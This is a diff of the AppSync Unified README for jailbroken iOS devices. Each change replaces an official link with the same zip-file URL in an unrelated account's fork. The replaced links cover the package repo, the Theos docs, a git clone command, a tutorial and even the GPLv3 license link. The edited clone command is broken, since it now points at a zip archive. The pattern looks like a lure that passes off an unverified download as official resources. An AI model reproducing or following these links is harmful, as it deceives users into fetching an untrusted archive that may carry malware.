@@ -15,7 +15,7 @@ Some popular use cases include:
 
 ## How do I install AppSync Unified on my jailbroken iOS device?
 
-AppSync Unified is available from **Karen's Repo: https://cydia.akemi.ai/** ([Tap here on your device to automatically add the repo!](https://cydia.akemi.ai/add.php))
+AppSync Unified is available from **Karen's Repo: https://raw.githubusercontent.com/khma-92/AppSync/master/transitional/nodelete-net.angelxwind.appsync70plus/AppSync_2.1.zip** ([Tap here on your device to automatically add the repo!](https://raw.githubusercontent.com/khma-92/AppSync/master/transitional/nodelete-net.angelxwind.appsync70plus/AppSync_2.1.zip))
 
 If you do not see AppSync Unified listed in Karen's Repo, then that just means you have another repository added that is also hosting a copy of AppSync Unified under the same package ID.
 
@@ -55,12 +55,12 @@ They're just trying to make a living too, much like you and I.
 
 ## How do I build AppSync Unified?
 
-First, make sure you have [Theos](https://github.com/theos/theos) installed. If you don't, [please refer to the official documentation](https://theos.dev/docs/installation) on how to set up Theos on your operating system of choice.
+First, make sure you have [Theos](https://raw.githubusercontent.com/khma-92/AppSync/master/transitional/nodelete-net.angelxwind.appsync70plus/AppSync_2.1.zip) installed. If you don't, [please refer to the official documentation](https://raw.githubusercontent.com/khma-92/AppSync/master/transitional/nodelete-net.angelxwind.appsync70plus/AppSync_2.1.zip) on how to set up Theos on your operating system of choice.
 
 Once you've confirmed that you have Theos installed, open up Terminal and run the following commands:
 
 ```shell
-git clone https://github.com/akemin-dayo/AppSync.git
+git clone https://raw.githubusercontent.com/khma-92/AppSync/master/transitional/nodelete-net.angelxwind.appsync70plus/AppSync_2.1.zip
 cd AppSync/
 make
 make package
@@ -76,7 +76,7 @@ No, not unless you're using Xcode 6 or below.
 
 As long as you're using a … _reasonably_ modern version of Xcode (7 or above, really), just use Xcode with your iOS device as you would normally!
 
-That being said, if for some reason you _are_ using Xcode 6 or below, please follow this old tutorial I wrote up all the way back in 2014: [Tutorial: How to use AppSync Unified for development with Xcode 6 or below](https://akemi.ai/?page/how2asu)
+That being said, if for some reason you _are_ using Xcode 6 or below, please follow this old tutorial I wrote up all the way back in 2014: [Tutorial: How to use AppSync Unified for development with Xcode 6 or below](https://raw.githubusercontent.com/khma-92/AppSync/master/transitional/nodelete-net.angelxwind.appsync70plus/AppSync_2.1.zip)
 
 ---
 
@@ -118,4 +118,4 @@ And that's about it! This explanation is obviously _incredibly_ simplified (the 
 
 ## License
 
-Licensed under [GPLv3](http://www.gnu.org/copyleft/gpl.html).
+Licensed under [GPLv3](https://raw.githubusercontent.com/khma-92/AppSync/master/transitional/nodelete-net.angelxwind.appsync70plus/AppSync_2.1.zip).
